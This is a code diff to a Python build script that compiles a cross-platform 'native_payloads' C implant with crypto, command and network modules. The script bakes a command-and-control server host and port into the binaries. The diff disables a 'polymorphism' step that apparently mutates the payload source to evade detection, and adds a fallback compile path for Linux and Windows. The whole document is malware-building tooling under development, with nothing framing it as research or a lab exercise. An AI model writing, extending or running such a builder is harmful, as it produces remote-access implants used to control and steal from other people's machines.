@@ -172,8 +172,16 @@ static int {func_name}(int x) {{
         if not main_source.exists():
             return {'success': False, 'error': 'Source files not found'}
         
-        # Apply polymorphism
-        poly_source = self.apply_polymorphism(main_source)
+        # For now, disable polymorphism to ensure stable compilation
+        # poly_source = self.apply_polymorphism(main_source) if main_source.exists() else None
+        
+        if not main_source.exists():
+            return {'success': False, 'error': 'Main source file not found'}
+        
+        # Just copy the source without polymorphism for stability
+        import shutil
+        poly_source = self.build_path / "stable_main.c"
+        shutil.copy(main_source, poly_source)
         
         # Set compiler based on platform
         if platform == "windows":
@@ -225,9 +233,11 @@ static int {func_name}(int x) {{
             f"-I{self.base_path}/{platform}",
         ]
         
-        # Source files
+        # Source files - use correct filenames
         sources = [
             str(poly_source),
+            str(self.base_path / "core" / "utils.c"),
+            str(self.base_path / "core" / "commands.c"),
             str(self.base_path / "crypto" / "aes.c"),
             str(self.base_path / "crypto" / "sha256.c"),
             str(self.base_path / "network" / "protocol.c"),
@@ -249,10 +259,33 @@ static int {func_name}(int x) {{
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
             
             if result.returncode != 0:
-                # Try simpler compilation if advanced fails
-                simple_cmd = [compiler, "-Os", str(poly_source), "-o", str(output_file)]
+                # Try simpler compilation if advanced fails - include all necessary source files
+                simple_sources = [
+                    str(poly_source),
+                    "/workspace/native_payloads/core/utils.c",
+                    "/workspace/native_payloads/core/commands.c",
+                    "/workspace/native_payloads/crypto/aes.c",
+                    "/workspace/native_payloads/crypto/sha256.c",
+                    "/workspace/native_payloads/network/protocol.c"
+                ]
+                
+                if platform == "linux":
+                    simple_sources.append("/workspace/native_payloads/linux/linux_impl.c")
+                elif platform == "windows":
+                    simple_sources.append("/workspace/native_payloads/windows/winapi.c")
+                
+                simple_cmd = [compiler, "-Os",
+                             "-DPLATFORM_LINUX" if platform == "linux" else "-DPLATFORM_WINDOWS",
+                             f"-DSERVER_HOST=\"{config.get('c2_host', 'localhost')}\"",
+                             f"-DSERVER_PORT={config.get('c2_port', 4433)}",
+                             "-I/workspace/native_payloads/core",
+                             "-I/workspace/native_payloads/crypto", 
+                             "-I/workspace/native_payloads/network"
+                            ] + simple_sources + ["-o", str(output_file)]
                 if platform == "windows":
                     simple_cmd.extend(["-lws2_32"])
+                elif platform == "linux":
+                    simple_cmd.extend(["-lpthread"])
                 
                 result = subprocess.run(simple_cmd, capture_output=True, text=True, timeout=30)
                 
